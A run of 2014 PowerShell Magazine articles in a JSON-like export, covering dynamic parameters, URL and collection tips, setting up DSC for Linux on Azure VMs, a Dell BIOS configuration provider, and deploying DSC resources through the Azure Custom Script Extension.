have to expose it to the runspace. We use the RuntimeDefinedParameterDictionary object for this. After we create the RuntimeDefinedParameter object we add our $ageParam RuntimeDefinedParameter. Finally, we return that dictionary.\n$paramDictionary = new-objectSystem.Management.Automation.RuntimeDefinedParameterDictionary $paramDictionary.Add('age', $ageParam) return $paramDictionary  Our dynamic parameter code looks like this now:\nDynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { $ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.Position = 3 $ageAttribute.Mandatory = $true $ageAttribute.HelpMessage = \u0026quot;Please enter your age:\u0026quot; $attributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute] $attributeCollection.Add($ageAttribute) $ageParam = New-Object System.Management.Automation.RuntimeDefinedParameter('age', [Int16], $attributeCollection) $paramDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary $paramDictionary.Add('age', $ageParam) return $paramDictionary } } Testing our Dynamic Parameter Now we have a dynamic parameter of ‘age’ that will only show up if the $product is set to Hard Lemonade. Now we can get this information for our new product under these conditions. Here is our ELS code right now.\nfunction Get-Order { [CmdletBinding()] Param( [Parameter( Mandatory=$true, Position=1, HelpMessage=\u0026quot;How many cups would you like to purchase?\u0026quot; )] [int]$cups, [Parameter( Mandatory=$false, Position=2, HelpMessage=\u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;,\u0026quot;Hard Lemonade\u0026quot;)] [string]$product=\u0026quot;Lemonade\u0026quot; ) DynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { #create a new ParameterAttribute Object $ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.Position = 3 $ageAttribute.Mandatory = $true $ageAttribute.HelpMessage = \u0026quot;This product is only available for customers 21 years of age and older. Please enter your age:\u0026quot; #create an attributecollection object for the attribute we just created. $attributeCollection = new-object System.Collections.ObjectModel.Collection[System.Attribute] #add our custom attribute $attributeCollection.Add($ageAttribute) #add our paramater specifying the attribute collection $ageParam = New-Object System.Management.Automation.RuntimeDefinedParameter('age', [Int16], $attributeCollection) #expose the name of our parameter $paramDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary $paramDictionary.Add('age', $ageParam) return $paramDictionary } } Process { $order = @() for ($cup = 1; $cup -le $cups; $cup++) { $order += \u0026quot;$($cup): A cup of $($product)\u0026quot; } $order } }  Testing our ELS script we get the following output:\nPS C:\\psf\\scripts\u0026gt; Import-Module .\\get-order.ps1 -Force PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; cmdlet Get-Order at command pipeline position 1 Supply values for the following parameters: (Type !? for Help.) age: 21 1: A cup of Hard Lemonade 2: A cup of Hard Lemonade 3: A cup of Hard Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 1: A cup of Lemonade 2: A cup of Lemonade 3: A cup of Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Water\u0026quot; 1: A cup of Water 2: A cup of Water 3: A cup of Water PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Tea\u0026quot; 1: A cup of Tea 2: A cup of Tea 3: A cup of Tea PS C:\\psf\\scripts\u0026gt; Excellent! If we specify “Hard Lemonade” as the product parameter, we get prompted for the age parameter. It doesn’t ask our age for the default of “Lemonade” or for “Water”, or “Tea”. However, we are not done yet. We still need to verify that their age is 21 or older! We haven’t done anything with the new age parameter.\nAdding Criteria for the Age ParameterAttribute To verify the age is set to 21 or older we can access our dynamic parameter through the $PSBoundParameters variable. For our dynamic variable we would reference $PSBoundParameters.age. We want to ensure that age is set to 21 or higher so we need to do this logic test in our Begin {} block. If the age is set and less than 21 it should write an error and stop the script; otherwise, it should continue as normal.\nBegin { if ($PSBoundParameters.age -and $PSBoundParameters.age -lt 21) { Write-Error \"You are not old enough for Hard Lemonade. How about a nice glass of regular Lemonade instead?\" -ErrorAction Stop } }  Final Code and Testing Once we add our age check in the Begin block of our code we now have our finished Electronic Lemonade Stand script!\nFunction Get-Order { [CmdletBinding()] param( [Parameter( Mandatory=$true, Position=1, HelpMessage=\u0026quot;How many cups would you like to purchase?\u0026quot; )] [int]$cups, [Parameter( Mandatory=$false, Position=2, HelpMessage=\u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;,\u0026quot;Hard Lemonade\u0026quot;)] [string]$product=\u0026quot;Lemonade\u0026quot; ) DynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { #create a new ParameterAttribute Object $ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.Position = 3 $ageAttribute.Mandatory = $true $ageAttribute.HelpMessage = \u0026quot;This product is only available for customers 21 years of age and older. Please enter your age:\u0026quot; #create an attributecollection object for the attribute we just created. $attributeCollection = new-object System.Collections.ObjectModel.Collection[System.Attribute] #add our custom attribute $attributeCollection.Add($ageAttribute) #add our paramater specifying the attribute collection $ageParam = New-Object System.Management.Automation.RuntimeDefinedParameter('age', [Int16], $attributeCollection) #expose the name of our parameter $paramDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary $paramDictionary.Add('age', $ageParam) return $paramDictionary } } Begin { if ($PSBoundParameters.age -and $PSBoundParameters.age -lt 21) { Write-Error \u0026quot;You are not old enough for Hard Lemonade. How about a nice glass of regular Lemonade instead?\u0026quot; -ErrorAction Stop } } Process { $order = @() for ($cup = 1; $cup -le $cups; $cup++) { $order += \u0026quot;$($cup): A cup of $($product)\u0026quot; } $order } }  Here is the output from our ESL system.\nTest to ensure previous items still work as originally scripted.\nPS C:\\psf\\scripts\u0026gt; Get-Order 3 1: A cup of Lemonade 2: A cup of Lemonade 3: A cup of Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 Water 1: A cup of Water 2: A cup of Water 3: A cup of Water PS C:\\psf\\scripts\u0026gt; Get-Order 3 Tea 1: A cup of Tea 2: A cup of Tea 3: A cup of Tea PS C:\\psf\\scripts\u0026gt; Get-Order 3 Coffee 1: A cup of Coffee 2: A cup of Coffee 3: A cup of Coffee Now to test the “Hard Lemonade” product prompt and age logic for a value less than 21. PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; cmdlet Get-Order at command pipeline position 1 Supply values for the following parameters: (Type !? for Help.) age: 18 Get-Order : You are not old enough for Hard Lemonade. How about a nice glass of regular Lemonade instead? At line:1 char:1 + Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; + ~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Write-Error], WriteErrorException + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Get-Order Now to test the “Hard Lemonade” product prompt and age logic for a value 21 or greater. PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; cmdlet Get-Order at command pipeline position 1 Supply values for the following parameters: (Type !? for Help.) age: 21 1: A cup of Hard Lemonade 2: A cup of Hard Lemonade 3: A cup of Hard Lemonade Testing our age dynamic parameter as a 3rd positional parameter. PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; 34 1: A cup of Hard Lemonade 2: A cup of Hard Lemonade 3: A cup of Hard Lemonade PS C:\\psf\\scripts\u0026gt; Conclusion Success! We have created a dynamic parameter that only appears when our product is “Hard Lemonade” and will only return that product if the age is 21 or older. Our previous functionality is still there and our enhancement only shows up under a specific condition.\nDynamic parameters can be very useful and powerful. They may not be the best approach for every situation, but if they are used properly they can save on development time and error checking.\nI encourage you to mess around with the ESL script. Try to add more dynamic parameters based on the product condition. Hopefully this article has increased your understanding of dynamic parameters and how to implement them properly.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/29/dynamic-parameters-in-powershell/","tags":["How To"],"title":"Dynamic Parameters in PowerShell"},{"categories":["Tips and Tricks"],"contents":"The System.Uri class in .NET provides a way to validate if a URL is an absolute URL or not. This can be quite handy when your script deals with downloading content from web pages and there is a need to validate the specified URL.\nThe IsWellFormedUriString method provides this capability.\n[system.uri]::IsWellFormedUriString($url,[System.UriKind]::Absolute) The UriKind enumeration has three values–Absolute, Relative, and RelativeOrAbsolute. The IsWellFormedUriString() method returns a Boolean value based on the match.\nI wrapped this in a small function called Test-Url:\nFunction Test-Url { [CmdletBinding()] param ( [Parameter(Mandatory=$true)] [String] $Url ) Process { if ([system.uri]::IsWellFormedUriString($Url,[System.UriKind]::Absolute)) { $true } else { $false } } }  And, here is a practical example where I am using this function.\n$doc = Invoke-WebRequest -Uri 'https://www.python.org/downloads' foreach ($href in ($doc.links.href -ne '')) { if (Test-Url -Url $href) { $href } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/29/pstip-test-if-a-url-is-absolute-or-not/","tags":["Tips and Tricks"],"title":"#PSTip Test if a URL is absolute or not"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nStarting with PowerShell 3.0, it is possible to filter a collection for matching or non-matching values using comparison operators. For example, assume that I have a collection with four elements in it.\n$Collection = 'test1','test2','test3','test4'  I want to filter this collection and retrieve all values except ‘test3’. How do we do that? We can use comparison operators here. When using a comparison operator, when the left-hand side value is a collection, the comparison results in matching values.\n$Collection -ne 'test3'  This returns all elements except ‘test3’.\n[Update: 5/29/2014] There are gotchas in using this method for collection filtering. Roman Kuzmin provided a great answer to a question on Stack Overflow that explains these gotchas.\nHere is a more practical and real-world example. I was looking for a way to filter a list of URLs for non-empty strings.\n$doc = Invoke-WebRequest -Uri 'https://www.python.org/downloads' foreach ($href in ($doc.links.href -ne '')) { $href }  Remember, the right-hand side value has to be a scalar value.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/28/pstip-filtering-a-collection-using-comparison-operators/","tags":["Tips and Tricks"],"title":"#PSTip Filtering a collection using comparison operators"},{"categories":["Linux","Azure","PowerShell DSC"],"contents":"[Update 1: 5/23/2014] Added pre-requisite install commands for Oracle Linux\nI am sure you are aware of the Microsoft’s announcement of the CTP release of DSC for Linux. This is an exciting announcement and I wanted to explore more on this. There is a very useful step-by-step guide by Kristopher Bash on the Microsoft Building Clouds blog on how to set up DSC for Linux. These steps assume that you have a Linux VM that is either Fedora/RHEL/Cent OS. It will be clear if you follow the comments on that post that the steps needed some updates and there is different set of commands you need to run for the other Linux distributions such as Ubuntu and Debian. In this post, I will talk about these differences and how to setup DSC for Linux in Azure Linux VMs. Thanks to Kristopher Bash for the start!\nIf you also plan to use Azure VMs for this purpose, don’t miss the Azure VM configuration requirements towards the end of this article.\nThis post assumes that you have the necessary Azure Linux VMs. To follow the steps in this article, you’ll need either CentOS or Ubuntu or Oracle Linux VMs. I deployed these Linux VMs from the Azure VM gallery. Also, this article assumes that the systems or VMs where you are deploying DSC for Linux have Internet connectivity. There are a bunch of pre-requisites you need to install before installing OMI Server or DSC LCM. This is where the first difference is.\nNote: For all steps listed below, you need root access. You can use sudo -s to elevate the privileges.\nInstalling Pre-requisites in CentOS We use the Yum repository to install the required pre-requisites. I will not go into the details of each but it should be clear from the package names. In this following set of commands, I have added -y switch to avoid the prompt.\nyum -y groupinstall 'Development Tools' yum -y install pam-devel yum -y install openssl-devel yum -y install python yum -y install python-devel  Installing Pre-requisites in Ubuntu The default package manager in Ubuntu is apt-get. So, we use apt-get to install the pre-requisites required for OMI and DSC. The package names here will be slightly different. Once again, I used -y switch to avoid any confirmation prompts.\napt-get -y install build-essential apt-get -y install pkg-config apt-get -y install python apt-get -y install python-dev apt-get -y install libpam-dev apt-get -y install libssl-dev  Installing Pre-requisites in Oracle Linux Thanks again to Kris. We use the Yum repository to install the required pre-requisites which is similar to Cent OS. However, we need to install wget and kernel-headers packages on Oracle Linux.\nyum -y groupinstall 'Development Tools' yum -y install pam-devel yum -y install openssl-devel yum -y install python yum -y install python-devel yum -y install wget yum -y install kernel-headers  Downloading and Building OMI Server Next, we need to download and install OMI Server. How this is done is common across various versions of Linux. The OMI build can be downloaded from Open Group site. The current version of OMI server is 1.0.8.\nmkdir /root/downloads cd /root/downloads wget https://collaboration.opengroup.org/omi/documents/30532/omi-1.0.8.tar.gz tar -xvf omi-1.0.8.tar.gz cd omi-1.0.8 ./configure | tee /tmp/omi-configure.txt make | tee /tmp/omi-make.txt make install | tee /tmp/omi-make-install.txt The tee command with make and make install commands will help us capture the output from the make process for any analysis later. The above set of commands build and install the OMI server.\nDownloading and Building DSC LCM The Linux DSC build is available on Github. This can be downloaded to the Linux system and configured. The following steps are common across Linux versions.\ncd /root/downloads wget https://github.com/MSFTOSSMgmt/WPSDSCLinux/releases/download/v1.0.0-CTP/PSDSCLinux.tar.gz tar -xvf PSDSCLinux.tar.gz cd dsc/ mv * /root/downloads/ cd /root/downloads make | tee /tmp/dsc-make.txt make reg | tee /tmp/dsc-make-reg.txt The make command for building DSC will throw a lot of warning messages on Ubuntu. It is not completely clear about the impact of those warning messages. However, since DSC LCM works as expected, I have put the same steps for both versions of Linux I verified.\nWe now have the OMI Server and DSC LCM built. We can start the OMI Server so that the access to DSC LCM is enabled.\nOMI_HOME=/opt/omi-1.0.8 /opt/omi-1.0.8/bin/omiserver -d The above commands set the $OMI_HOME variable in the shell and start the OMI Server. At this moment, you should be able to create a CIM session to connect to these Linux systems.\nThings to note before you proceed with DSC By default, the OMI server listens at port number 5985/5986. You can change this by editing the omiserver.conf at /opt/omi-1.0.8/etc/. For now, let us move on with the default port configurations. Also, at this moment, you cannot use the Azure user account created during VM provisioning for enacting DSC configuration. It results in permission issues.\nIf you are also using Azure VMs, you need to first enable these endpoints.\nConfiguring Azure VM endpoints for DSC Azure Linux VMs, by default, are not configured to provide access to ports 5895 and 5896. So, we need to add this endpoint first. We can use the Azure PowerShell cmdlets to do this.\nGet-AzureVM -ServiceName \u0026quot;DSCDemo\u0026quot; -Name \u0026quot;DSCLinux\u0026quot; | Add-AzureEndpoint -Name \u0026quot;DSCLinux-HTTPS\u0026quot; -Protocol TCP -LocalPort 5896 -PublicPort 5896 -Verbose | Update-AzureVM -Verbose Get-AzureVM -ServiceName \u0026quot;DSCDemo\u0026quot; -Name \u0026quot;DSCLinux-1\u0026quot; | Add-AzureEndpoint -Name \u0026quot;DSCLinux-HTTPS\u0026quot; -Protocol TCP -LocalPort 54321 -PublicPort 5896 -Verbose | Update-AzureVM -Verbose Resetting root password You can skip this step if you are using non-Azure VMs or already have root access to your Linux systems for pushing DSC configuration. The Linux Azure VMs, by default, do not provide the root user password. So, therefore you need to reset the root account password. This can be done using the passwd command. On the CentOS VM, you need to first reset security context of /etc/shadow file.\nchcon -t shadow_t /etc/shadow passwd root  This is it. We are all set to connect to the Azure Linux VMs and push DSC configuration.\nThe built-in DSC resources in DSC Linux are different from what we have on Windows systems. So, we first need to copy the DSC Linux resources to the Windows systems from which you will be connecting to Linux DSC. These resources are available in the GitHub repository at https://github.com/MSFTOSSMgmt/WPSDSCLinux/releases/download/v1.0.0-CTP/nx-PSModule.zip. You need to extract the contents of this archive to %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\Modules.\nConfiguration Document for Linux Systems For the purpose of demonstration, we will use a simple nxFile resource and create a file called dsctest in /tmp directory of Linux VMs.\nConfiguration MyDSCDemo { Import-DSCResource -Module nx Node \"DSCDemo.cloudapp.net\"{ nxFile myTestFile { Ensure = \"Present\" Type = \"File\" DestinationPath = \"/tmp/dsctest\" Contents=\"This is my DSC Test!\" } } }  You can simply load this configuration into memory and create the MOF file by executing the configuration command MyDSCDemo.\nCreating CIM sessions Before enacting the configuration, we need to create a CIM session to the Linux system.\n$username = \u0026quot;azureuser\u0026quot; $hostname = \u0026quot;dscdemo.cloudapp.net\u0026quot; $port = 54321 $Cred = Get-Credential -UserName root -Message \u0026quot;Enter root password\u0026quot; $CimOptions = New-CimSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -UseSsl $cimSession = New-CimSession -Credential $Cred -ComputerName $hostname -Port $port -Authentication Basic -SessionOption $CimOptions We now have a CIM Session and a MOF created for the configuration. We can now use the Start-DscConfiguration cmdlet to enact this.\nStart-DscConfiguration -Wait -Verbose -CimSession $cimSession -Path .\\MyDSCDemo  You can check if the configuration is applied or not by using the Get-DscConfiguration cmdlet.\nOn the Linux VM, you can find the DSC logs at $OMI_HOME/var/log/.\nThe Building Clouds blog that has the step by step guidance also talks about creating a init script to start OMI Server every time you start the Linux system. However, the way it is written, it only works on CentOS and Fedora. I am looking for another version of it for Debian/Ubuntu systems. I will update this post when I have some solid solution for that.\nNext up, we will see how to create custom DSC Linux resources. There is a lot to discuss. Watch this space.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/21/installing-and-configuring-dsc-for-linux/","tags":["Azure","PowerShell DSC","Linux"],"title":"Installing and configuring DSC for Linux"},{"categories":["News","PowerShell DSC","Linux"],"contents":"When I was speaking at DevOpsDays India and demonstrating Windows PowerShel DSC (6 months ago), several people in the room had a laugh as I’d mentioned Microsoft and OpenSource. I’d mentioned that DSC is based on standards and it will, one day, be extended to Unix and Linux platforms. I spoke about configuration management of your entire data centre based on standards like CIM and WS-MAN. And, that is available today!\nIf you were at TechEd or watched it online or followed #msteched on Twitter, you would have noticed the buzz around an Open Source announcement by Jeffrey Snover. Microsoft released a CTP version of DSC for Linux on GitHub.\nPrerequisites  Development tools (g++, GNU make) OMI 1.0.8 (https://collaboration.opengroup.org/omi/documents/30532/omi-1.0.8.tar.gz) Windows PowerShell Desired State Configuration for Linux source (https://github.com/MSFTOSSMgmt/WPSDSCLinux/releases/download/v1.0.0-CTP/PSDSCLinux.tar.gz) Python 2.5 or later and python-devel  Building OMI 1.0.8 requires the following packages:\n pam-devel openssl-devel  This initial CTP release has only a few DSC resources available!\n nxFile – manage files and directory state nxScript – runs script blocks on target nodes nxUser – manages Linux users nxGroup – manages Linux groups nxService – manages Linux services (System-V, Upstart, SystemD)  Hey, this is open sourced. So, let us build this together!\nA complete step-by-step guidance for this is available at: http://blogs.technet.com/b/privatecloud/archive/2014/05/19/powershell-dsc-for-linux-step-by-step.aspx\nThis is really an exciting time and I will be closely following the development and writing my observations and learning here. Watch this space.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/19/microsoft-announced-the-ctp-release-of-windows-powershell-desired-state-configuration-for-linux/","tags":["News","PowerShell DSC","Linux"],"title":"Microsoft announced the CTP release of Windows PowerShell Desired State Configuration for Linux"},{"categories":["News"],"contents":"Windows PowerShell team just announced the availability of WMF 5.0 Preview May 2014 release. This includes an exciting new feature called PowerShellGet.\nPowerShellGet is a new way to discover, install, and update PowerShell Modules. New in WMF 5.0 Preview May 2014, PowerShellGet contains a set of cmdlets that enable users to interact with an online module gallery.\nIf you have not tried WMF 5.0 Preview yet, it includes a new package management framework called OneGet and good number of changes/fixes to Desired State Configuration. I will write here about some more changes to DSC soon. So, watch this space.\nGo ahead and try WMF 5.0 Preview.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/14/powershell-module-management-as-a-native-feature-is-here/","tags":["News"],"title":"PowerShell module management as a native feature is here!"},{"categories":["Dell"],"contents":"Familiar with a PowerShell provider? If yes, you must have appreciated the fact that once you learn to use a provider then it is almost effortless to learn and use any other built-in or 3rd-party provider. The PowerShell provider framework has a fixed number of cmdlets and a provider exposes all or subset of them depending on its implementation. And as always, there is the Get-Help \u0026lt;provider name\u0026gt; cmdlet which saves you from remembering everything about using the provider.\nOne of the latest offerings from Dell’s Enterprise Solutions Group is a PowerShell provider which can configure BIOS settings of the Latitude, Optiplex, Precision and the Venue 11 systems. If you are familiar with CCTK command line utility for managing Dell Business client systems, you can perform the same set of operations as the CCTK utility using this new PowerShell provider.\n[Update: Download the beta provider at http://en.community.dell.com/techcenter/enterprise-client/w/wiki/6901.dell-client-powershell-provider.aspx]\nYou can manage the BIOS settings on these client systems using the Dell OMCI WMI provider too. Then, why we chose to come up with a provider and not a binary module in PowerShell space? The answer is simple. If you have already invested in learning PowerShell and understand the basics of using the cmdlets such as Get-ChildItem, Get-Item , and so on, you should be able to apply that knowledge to manage the Dell Business client system BIOS settings. Also, going through the WMI classes and writing WMI queries is probably not a happy choice for administrators.\nTo add to that, here are a list of additional advantages with a PowerShell provider implementation.\n Number of cmdlets exposed by a provider framework is fixed and all of them are known to users today. And this set is not huge, merely \u0026lt; 20. All provider cmdlets are standard in nature. Users don’t have to learn about any new name or syntax of a custom cmdlet as is the case with a module. You start with root item and can navigate (cd , dir) the entire tree of underlying objects which are BIOS attributes for Dell SMBIOS provider. No need to know any strings in advance. Even with subsequent releases, number of interfaces or cmdlets is not going to be swollen. They will remain exactly the same. You will get a product with more features (minus the hassle of learning new cmdlets). This is in contrast with a module, which mostly exposes a new set of cmdlets with a newly added feature.  For example, had we come up with a module instead of a PowerShell provider, number of cmdlets that we may have to expose could be directly proportional to number of BIOS attributes. And that’s a significantly large number.\nLet’s take a quick look of the capabilities of Dell Client PowerShell Provider:\n It represents the SMBIOS attributes in the same fashion as in Setup Menu (F2). Strings for attribute names and their settings and the categories are largely same as in Setup Menu (F2). You can navigate through the BIOS attributes using cd and dir commands. Start with the root node which is a DellSmbios: drive:  cd Dellsmbios:   You can configure a BIOS attribute:\nSet-Item Dellsmbios:\\PostBehaviour\\NumLock Enabled    You can set, change or clear the Admin password and System password   You can configure the TPM security settings   You can change the legacy or UEFI boot sequence   You can check the service tag and change the asset tag   Provider can be integrated in the Windows PE .wim image   Generic syntax of the cmdlets:\n cd –Path \u0026lt;Path to Drive/Category\u0026gt; dir -Path \u0026lt;Path to Drive/Category/Attribute\u0026gt; Set-Item –Path \u0026lt;Path to Attribue\u0026gt; -Value \u0026lt;Value To Set\u0026gt; -Password \u0026lt;password value\u0026gt;  Note 1 – If Admin or System password is installed, Use the –Password parameter to provide the password with Set-Item. If password is not installed, the -Password parameter is not processed.\nNote 2 – Since –Path and –Value are positional parameters, you can omit writing them.\nNote 3 – To find a valid \u0026lt;Value To Set\u0026gt;, please check PossibleValues property of an attribute.\nNote 4 – Strings for category, attribute and value are case-insensitive.\nNote 5 – -Password parameter accepts password as a plain string as of now.\n#Set BIOS Admin Password Set-Item -Path Dellsmbios\\Security\\AdminPassword –Value dell123 #Change BIOS Admin Password Set-Item -Path Dellsmbios\\Security\\AdminPassword –Value dell1234 –Password dell123 #Clear BIOS Admin Password Set-Item -Path Dellsmbios\\Security\\AdminPassword –Value “” –Password dell123 #Disable Chassis Intrusion alert Set-Item -Path Dellsmbios\\Security\\ChassisIntrusion -Value Disabled #Set Wake On Lancd Set-Item -Path Dellsmbios:\\PowerManagement\\WakeOnLANorWLAN -Value \u0026quot;LANorWLAN\u0026quot; #Change Asset Tag Set-Item –Path DellSmbios:\\SystemInformation\\AssetTag MyAssetTag -Password dell123 #Set WWAN Connection AutoSense Set-Item -Path Dellsmbios:\\PowerManagement\\ControlWWANRadio -Value Enabled #Get Service Tag Get-ChildItem DellSmbios:\\SystemInformation\\ServiceTag #Get Boot Sequence Get-ChildItem DellSmbios:\\BootSequence\\Bootsequence #Enable PXE boot Set-Item -Path Dellsmbios:\\SystemConfiguration\\\"Integrated NIC\" -Value \"Enabled w PXE\"  Dell Client PowerShell Provider is easy to use and commands are intuitive. Give it a try and share your feedback at http://en.community.dell.com/techcenter/enterprise-client/f/4887.aspx\nTest-Dellprovider!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/12/dell-business-client-bios-configuration-powershell-provider/","tags":["Dell"],"title":"Dell Business Client BIOS Configuration PowerShell Provider"},{"categories":["PowerShell DSC","Azure"],"contents":"In an earlier article, I showed you how to use the Custom Script Extension. The examples that I had there were too trivial and were intended to explain how the Custom Script Extension works. In this article, I will show one of the use cases for the Custom Script Extension. I have been using this to deploy my custom DSC resources to my Azure virtual machines.\nFor the purpose of storing all the DSC resources, I created a container in my existing Azure storage account and made that a public container. So, you can use most of the content and scripts from this post to deploy the DSC resources to your Azure VMs. Without delay, let us see how this is done.\nCopying files/folders to an Azure container First of all, I will show you the code that is used to copy the DSC resources to a storage container. You can certainly use one of the Azure storage explorers out there to achieve this. But, hey, this is PowerShell Magazine! 🙂\n$StorageAccount = 'psmag' $StorageKey = 'storagekey' $StorageContainer = 'scripts' $LocalFolderPath = 'C:\\DSCResources' $StorageContext = New-AzureStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $StorageKey $AzureBlobContainer = Get-AzureStorageContainer -Name $StorageContainer -Context $StorageContext foreach ($file in (Get-ChildItem -Recurse $LocalFolderPath -File)) { Set-AzureStorageBlobContent -File $file.FullName -Blob (Split-Path -Path $file.FullName -NoQualifier) -Context $StorageContext -Container $StorageContainer -Force } Within Azure storage, there is no concept called subfolders. There is a storage account and a single container. For using the above code, you need to replace the values of $StorageAccount, $StorageContainer, and $StorageKey variables to your own. Also, you need to extract the recent wave of DSC resources from PowerShell team to C:. This is how that looks on my system.\nLike I’d mentioned, there is no concept of subfolders in Azure containers. So, when we need to upload a complete folder structure to an Azure container, we need to use a technique that uses the folder and subfolder names as part of the file name. For example, if there is a file at C:\\DSCResources\\xActiveDirectory\\DSCResources\\MSFT_xADUser\\MSFT_xADUser.psm1 and we need to upload this to an Azure container, we simply name the blob file name as /DSCResources/xActiveDirectory/DSCResources/MSFT_xADUser/MSFT_xADUser.psm1. In the above code, we just iterate through the local folder and convert each file name to the format we need for the Azure blob. This is what the Split-Path cmdlet is achieving inside the foreach loop.\nReading the contents of a public Azure container In an earlier article, I showed you how we can use the Azure blob services API to read the contents of a public Azure container. If you look into the contents of an Azure storage container either in the management portal or using the script I’d posted in the earlier article, you will notice that each blob inside the container has a blob URL and a name.\n$uri = \"http://psmag.blob.core.windows.net/scripts/?comp=list\u0026restype=container\" $wc = New-Object System.Net.WebClient $xml = (($wc.DownloadString($uri))).EnumerationResults $scripts = $xml.Blobs.Blob | ForEach-Object { if ($_.Name.StartsWith('/DSCResources')) { New-Object -TypeName PSObject -Property @{ BlobName = $_.Name.Remove(0,'/DSCResources/'.Length) BlobUrl = $_.Url } } }  As you see above, I am only interested in files that are copied as a part of DSC resources. I have so many other scripts in that container but it simply does not make sense to copy them to the modules folder. So, I am filtering the blob names for those that start with /DSCResources.\nOnce we have the name of file blob in the container, we need to convert it to the format the file system will understand. In this use case, we are looking at deploying DSC custom resource modules. There are different places you can copy the DSC resources to. In this example we will copy the DSC resources to C:\\Program Files\\WindowsPowerShell\\Modules folder. So, when copying to this folder, we don’t need the top level DSC resources folder. So, in the above script, I am removing /DSCResources/ from the blob file name. The final output can be seen in the above screenshot.\nDownloading the files and copying them to module path This is the final step. We have to invoke this action inside the Azure VM. And, the Azure Custom Script Extension is the method to do that. In an earlier article, I showed you how to use this extension. So, without going into the details, I will show you here how this extension can be used to deploy the custom DSC resources to an Azure VM. In the previous section, I had already showed you how to read the contents of a public Azure storage container and how to prepare the blob names so that we can use that to create the necessary folder structure. Now, we will see how the code for that can be modified to download the scripts and copy them to the file system inside the Azure VM.\nparam ( $BlobUri = \u0026quot;http://psmag.blob.core.windows.net/scripts\u0026quot;, $DSCResourcePath = \u0026quot;${env:ProgramFiles}\\WindowsPowerShell\\Modules\u0026quot; ) $Uri = \u0026quot;${BlobUri}/?comp=list\u0026amp;restype=container\u0026quot; $WebClient = New-Object System.Net.WebClient $BlobXml = (($WebClient.DownloadString($uri))).EnumerationResults $BlobXml.Blobs.Blob | ForEach-Object { if ($_.Name.StartsWith('/DSCResources')) { $FileRelativePath = $_.Name.Remove(0,'/DSCResources/'.Length) $FileFullPath = Join-Path -Path $DSCResourcePath -ChildPath $FileRelativePath if (-not (Test-Path (Split-Path $FileFullPath -Parent))) { New-Item -Path (Split-Path $FileFullPath -Parent) -ItemType Directory -ErrorAction Stop | Out-Null } $WebClient.DownloadFile($_.Url, $FileFullPath) Write-Host \u0026quot;Downloaded ${FileFullPath}\u0026quot; } } I copied the code shown above into a PowerShell script and called it CopyDSCResources.ps1. This is also available in my public Azure storage container. The New-Item cmdlet used within the foreach loop creates the necessary folder structure to copy the file. So, at the end of this script execution, we will have all the DSC resources copied to the Azure VM at the specified module location.\n$Vm = Get-AzureVM -ServiceName \"DSCDemo\" -Name \"DSCPull\" Set-AzureVMCustomScriptExtension -FileUri http://psmag.blob.core.windows.net/scripts/CopyDSCResources.ps1 -Run CopyDSCResources.ps1 -VM $Vm | Update-AzureVM -Verbose  This is it. You can use the last code snippet to copy the DSC resources from my public Azure container to your Azure VMs if you have enabled the Azure Custom Script Extension.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/05/02/copy-dsc-resources-to-azure-vms-using-custom-script-extension/","tags":["PowerShell DSC","Azure"],"title":"Copy DSC resources to Azure VMs using Custom Script Extension"},{"categories":["Azure"],"contents":"At Build 2014 conference, Microsoft launched the Azure VM Custom Script Extension. This is a very useful and straightforward extension. However, understanding it in detail helps make better use of it. Before we get started, there are a few prerequisites we need to take care of. The Azure VM agent is the first requirement and if your VMs don’t have this already installed, you can follow the procedure on the Microsoft Azure team blog. We can enable VM extensions in an Azure VM using the Azure PowerShell cmdlets. In fact, you need to update the existing Azure PowerShell module to version 0.8.0 or later.\nOnce we have all these prerequisites met and we have authenticated to Azure, let us just run 